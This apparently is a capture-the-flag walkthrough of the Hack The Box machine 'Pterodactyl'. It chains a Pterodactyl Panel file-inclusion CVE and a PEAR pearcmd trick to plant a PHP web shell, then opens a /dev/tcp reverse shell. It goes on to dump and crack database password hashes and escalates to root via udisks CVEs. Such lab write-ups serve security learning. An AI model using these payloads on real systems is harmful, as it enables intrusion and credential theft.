# Pterodactyl
## Enumeration
### Nmap
As always we start with a quick nmap scan
```bash
nmap -sV -T4 <IP>
```
this was the result
```bash
Not shown: 955 filtered tcp ports (no-response), 41 filtered tcp ports (host-unreach)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
80/tcp   open   http       nginx 1.21.5
443/tcp  closed https
8080/tcp closed http-proxy
```
### Web
Port 80 is hosting a website, so let's add `pterodactyl.htb` to our `/etc/hosts` and enumerate the website.  
<br>
Website looks to be advertising a minecraft server under `play.pterodactyl.htb`, I checked and that subdomain doesn't exist.  
We get our first real piece of info from `pterodactyl.htb/changelog.txt`.  
The interesting parts are:  
```bash

[Installed] Pterodactyl Panel v1.11.10
--------------------------------------
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
-------------------------------------
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```
A quick google search shows that `Pterodactyl v1.11.10` is vulnerable to [CVE-2025-49132](https://www.exploit-db.com/exploits/52341).  
PHP-PEAR paired with this CVE could allow us to get a reverse shell to the target machine.
```bash
python3 CVE-2025-49132.py http://pterodactyl.htb
Not vulnerable
```
We do not get a hit. Maybe let's try to find more VHOSTS?
```bash
ffuf -u http://pterodactyl.htb -w ~/files/wl/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.pterodactyl.htb" -t 100 -fc 302
```
We find a VHOST `panel`. Let's add `panel.pterodactyl.htb` to `/etc/hosts` and go see what `panel` holds.  
<br>
We see a login page, but we do not have any credentials, so let's try that exploit again.
```bash
python3 CVE-2025-49132.py http://panel.pterodactyl.htb
http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel
```
Good, we got database credentials and port `pterodactyl:PteraPanel`.  
Next we go to `pterodactyl.htb/phpinfo.php` as per `changelog.txt`, which exposes `PHP-PEAR` directory to be `/usr/share/php/PEAR`.  
### User flag
Now we have everything we need: `CVE-2025-49132`, `PHP-PEAR` and some database credentials. Let's get a shell.
#### Exploit
The `CVE-2025-49132` allows is to read any file that ends with `.php` on the target machine:
```bash
curl -g 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database'
```
This reads a file inside the pterodactyl panel folder `config/database.php`. You can check out PterodactylPanel github and see what other files you can find. I checked them all and didn't find anything interesting.  
Now we get to the real exploitation with `PHP-PEAR`:
```bash
curl -g 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../usr/share/php&namespace=PEAR/pearcmd&+config-create+/&/<?=`$_GET[0]`?>+/var/www/pterodactyl/public/stigs.php'
```
This will create a `stigs.php` file in the `/public/` directory. `stigs.php` will take a parameter that will be executed as a system command.
<br>
We can now connect.  
First `nc -lvnp 4444`  
Then:
```bash
curl 'http://panel.pterodactyl.htb/stigs.php?0=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<IP>/4444%200%3E%261%22'
```
And we got a reverse shell
```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.2.229 42034
bash: cannot set terminal process group (1212): Inappropriate ioctl for device
bash: no job control in this shell
wwwrun@pterodactyl:/var/www/pterodactyl/public> export TERM=xterm 
export TERM=xterm
```
Now we can navigate to `/home` then `cd phileasfogg3` and we can read the `user.txt` flag.  
### Going forward
After getting user flag i looked around the victim machine, but didnt find anything useful yet, so let's connect to that database, but first let's stabilize our reverse shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
This will stabilize our shell, and let us enter the database without the terminal freaking out.
```bash
mariadb -h 127.0.0.1 -P 3306 -u pterodactyl -p panel
Enter password: PteraPanel
```
We are in the database, so let's see what it holds.  
`SHOW TABLES;` gives us a bunch of random stuff, but `users` and `user_ssh_keys` look promising, so let's check them out.  
Unfortunately `user_ssh_keys` was empty, but `users` wasn't.  
```bash
MariaDB [panel]> SELECT root_admin, username, password FROM users;
SELECT root_admin, username, password FROM users;
+------------+--------------+--------------------------------------------------------------+
| root_admin | username     | password                                                     |
+------------+--------------+--------------------------------------------------------------+
|          1 | headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
|          0 | phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |
+------------+--------------+--------------------------------------------------------------+
```
We see that `headmonitor` is root, and `phileasfogg3` is normal user.  
Let's try to crack the hashes.
```bash
john hash.txt
```
We were only able to crack the hash for `phileasfogg3`:`!QAZ2wsx`. With these credentials, we can ssh as `phileasfogg3` into the target machine.
```bash
ssh phileasfogg3@pterodactyl.htb
(phileasfogg3@pterodactyl.htb) Password: !QAZ2wsx
```

### ROOT
First we go to `/var/mail` and read mail for `phileasfogg3`. It says that `udisksd` has been acting weird.  
Searching for `udisks privilege escalation` leads us to [CVE-2025-6019](https://github.com/guinea-offensive-security/CVE-2025-6019).  
Let's download that exploit to our LOCAL machine, and generate the `xfs.image` file (to do that you need to be root, and after running the script, choose option L(LOCAL))  
After the file is generated, transfer it to the target machine, along with `exploit.sh`. Now let's run `bash exploit.sh`
```bash
phileasfogg3@pterodactyl:/tmp/stigs> bash exploit.sh
PoC for CVE-2025-6019 (LPE via libblockdev/udisks)
WARNING: Only run this on authorized systems. Unauthorized use is illegal.
Continue? [y/N]: y
exploit.sh: line 242: check_dependencies: command not found
[*] Checking for vulnerable libblockdev/udisks versions...
[*] Detected udisks version: unknown
[!] Warning: Specific vulnerable versions for CVE-2025-6019 are unknown.
[!] Verify manually that the target system runs a vulnerable version of libblockdev/udisks.
[!] Continuing with PoC execution...
Select mode:
[L]ocal: Create 300 MB XFS image (requires root)
[C]ible: Exploit target system
[L]ocal or [C]ible? (L/C): C
[*] Starting exploitation on target machine...
[*] Checking allow_active status...
[-] Error: allow_active status not obtained. Exploitation may fail.
[-] Try exploiting CVE-2025-6018 first if applicable.
```
Let's exploit [CVE-2025-6018](https://www.exploit-db.com/exploits/52386) first, like the script suggests.
```bash
phileasfogg3@pterodactyl:/tmp/stigs> python3 6018.py 
Traceback (most recent call last):
  File "6018.py", line 19, in <module>
    import paramiko
ModuleNotFoundError: No module named 'paramiko'
```
I got the exploit on the target machine, but we can't install any libraries, so let's compile the python script and transfer it to target machine again.
```bash
ON YOUR OWN MACHINE
pyinstaller --onefile 6018.py
```
Then transfer it back to target machine.
```bash
./6018 -i 127.0.0.1 -u phileasfogg3 -p '!QZ2wsx'
```
Once this is successfull, you should be put in a `exploit$` interactive shell. From there you have to run the `6019` exploit.
```bash
exploit$ bash exploit.sh
...
[*] Checking for SUID bash in /tmp/blockdev*...
[+] SUID bash found: /tmp/blockdev.MMG6J3/bash
-rwsr-xr-x 1 root root 1446024 Feb 13 22:18 /tmp/blockdev.MMG6J3/bash
[*] Executing root shell...
bash-5.2# id
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
```
Congrats, you got root!

